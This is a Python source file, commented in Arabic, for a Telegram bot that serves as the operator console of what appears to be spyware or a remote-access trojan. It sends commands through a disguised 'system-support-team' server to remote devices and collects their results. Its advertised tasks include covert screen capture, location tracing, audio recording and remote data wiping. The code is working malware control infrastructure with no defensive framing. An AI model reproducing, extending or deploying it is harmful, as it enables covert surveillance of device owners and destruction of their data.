#!/usr/bin/env python3
# pos_manager_bot.py - لوحة القيادة النووية عبر تلغرام
# هذا البوت هو واجهة التحكم التي تتصل بالخادم (API) لإدارة الأجهزة.

import os
import sys
import requests
import telebot
from telebot import types
import logging

# -------------------- إعدادات الحماية النووية --------------------
BOT_TOKEN = os.environ.get('BOT_TOKEN')
if not BOT_TOKEN:
    logging.error("❌ BOT_TOKEN غير موجود في المتغيرات البيئية")
    sys.exit(1)

SERVER_URL = os.environ.get('SERVER_URL', 'https://system-support-team.onrender.com')
ACCESS_KEY = os.environ.get('ACCESS_KEY')
ADMIN_ID = int(os.environ.get('ADMIN_ID', 0))

if not ACCESS_KEY or ADMIN_ID == 0:
    logging.error("❌ ACCESS_KEY أو ADMIN_ID غير موجودين")
    sys.exit(1)

bot = telebot.TeleBot(BOT_TOKEN)
logging.basicConfig(level=logging.INFO)

# -------------------- دوال التواصل الآمن مع الخادم --------------------
def secure_api(endpoint, method='GET', payload=None):
    """إرسال طلب إلى الخادم مع المصادقة"""
    headers = {
        'X-Service-Auth': ACCESS_KEY,
        'Content-Type': 'application/json'
    }
    url = f"{SERVER_URL}{endpoint}"
    try:
        if method == 'GET':
            resp = requests.get(url, headers=headers, timeout=10)
        else:
            resp = requests.post(url, headers=headers, json=payload, timeout=10)
        if resp.status_code == 200:
            return resp.json()
        else:
            logging.warning(f"⚠️ خطأ {resp.status_code}: {resp.text}")
            return None
    except Exception as e:
        logging.error(f"🔴 فشل الاتصال بالخادم: {e}")
        return None

# -------------------- التحقق من صلاحية المستخدم (Admin فقط) --------------------
def is_admin(message):
    if message.from_user.id != ADMIN_ID:
        bot.send_message(message.chat.id, "⛔ أنت غير مصرح باستخدام هذا البوت.")
        return False
    return True

# -------------------- الأوامر الأساسية --------------------
@bot.message_handler(commands=['start', 'help'])
def send_welcome(message):
    if not is_admin(message):
        return
    # لوحة مفاتيح تفاعلية
    markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    markup.add('📱 قائمة الأجهزة', '📡 المهام النووية', '📥 النتائج', '📊 الحالة العامة')
    bot.send_message(
        message.chat.id,
        "☢️ **نظام القيادة المركزية POS** جاهز.\n"
        "استخدم الأزرار أو الأوامر المباشرة:\n"
        "`/list` – عرض الأجهزة\n"
        "`/task [client_serial] [command]` – إطلاق مهمة\n"
        "`/results` – آخر النتائج",
        reply_markup=markup,
        parse_mode='Markdown'
    )

# -------------------- عرض قائمة الأجهزة --------------------
@bot.message_handler(func=lambda m: is_admin(m) and m.text == '📱 قائمة الأجهزة')
@bot.message_handler(commands=['list'])
def list_clients(message):
    if not is_admin(message):
        return
    data = secure_api('/api/clients')
    if not data:
        bot.send_message(message.chat.id, "❌ لا توجد أجهزة مسجلة أو فشل الاتصال.")
        return
    text = "**📋 الأجهزة النشطة:**\n"
    for client in data:
        status_emoji = "🟢" if client.get('operational_status') == 'online' else "🔴"
        last_seen = client.get('last_ping', 'غير معروف')[:10]  # اختصار التاريخ
        text += f"{status_emoji} `{client['client_serial']}` (آخر ظهور: {last_seen})\n"
    bot.send_message(message.chat.id, text, parse_mode='Markdown')

# -------------------- إرسال مهمة (أمر) إلى جهاز --------------------
@bot.message_handler(commands=['task'])
def send_task(message):
    if not is_admin(message):
        return
    # التنسيق: /task client_serial command [parameters]
    parts = message.text.split(maxsplit=2)
    if len(parts) < 3:
        bot.reply_to(message, "⚠️ استخدم: `/task [client_serial] [command]`", parse_mode='Markdown')
        return
    target = parts[1]
    command = parts[2]

    payload = {
        'target_client': target,
        'request_type': command,
        'request_data': ''  # يمكن إضافة معاملات لاحقاً
    }
    result = secure_api('/api/command', method='POST', payload=payload)
    if result:
        bot.reply_to(message, f"🚀 **تم إطلاق المهمة** `{command}` إلى `{target}`")
    else:
        bot.reply_to(message, f"❌ فشل إطلاق المهمة")

# -------------------- جلب النتائج --------------------
@bot.message_handler(func=lambda m: is_admin(m) and m.text == '📥 النتائج')
@bot.message_handler(commands=['results'])
def fetch_results(message):
    if not is_admin(message):
        return
    data = secure_api('/api/results')
    if not data:
        bot.send_message(message.chat.id, "📭 لا توجد نتائج جديدة.")
        return
    text = "**📦 آخر النتائج:**\n"
    for item in data:
        if item.get('resolution_log'):
            # اقتطاع النص إذا كان طويلاً
            short_res = item['resolution_log'][:100] + "..." if len(item['resolution_log']) > 100 else item['resolution_log']
            text += f"• `{item['target_client']}`: {short_res}\n"
    bot.send_message(message.chat.id, text, parse_mode='Markdown')

# -------------------- المهام النووية (قائمة سريعة) --------------------
@bot.message_handler(func=lambda m: is_admin(m) and m.text == '📡 المهام النووية')
def nuclear_tasks_list(message):
    if not is_admin(message):
        return
    msg = (
        "**المهام النووية المباشرة:**\n\n"
        "📸 `capture_view` – تصوير الشاشة لحظياً\n"
        "📍 `trace_device` – تحديد الموقع الحالي\n"
        "🎤 `audio_probe` – تسجيل صوتي قصير\n"
        "🧨 `emergency_wipe` – تدمير البيانات\n\n"
        "للإرسال: `/task [الرقم] [المهمة]`"
    )
    bot.send_message(message.chat.id, msg, parse_mode='Markdown')

# -------------------- الحالة العامة --------------------
@bot.message_handler(func=lambda m: is_admin(m) and m.text == '📊 الحالة العامة')
def general_status(message):
    if not is_admin(message):
        return
    # يمكن إضافة فحص صحة الخادم هنا
    health = secure_api('/api/health-check')  # إذا كان لديك endpoint كهذا
    if health:
        bot.send_message(message.chat.id, f"🟢 النظام يعمل: {health}")
    else:
        bot.send_message(message.chat.id, "🟡 النظام يعمل، ولكن فشل الاتصال بخدمة الصحة.")

# -------------------- أي رسالة أخرى --------------------
@bot.message_handler(func=lambda m: is_admin(m))
def fallback(message):
    bot.send_message(message.chat.id, "❓ أمر غير معروف. استخدم /start للقائمة.")

# -------------------- تشغيل البوت --------------------
if __name__ == '__main__':
    logging.info("✅ بوت التحكم النووي قيد التشغيل...")
    bot.infinity_polling()
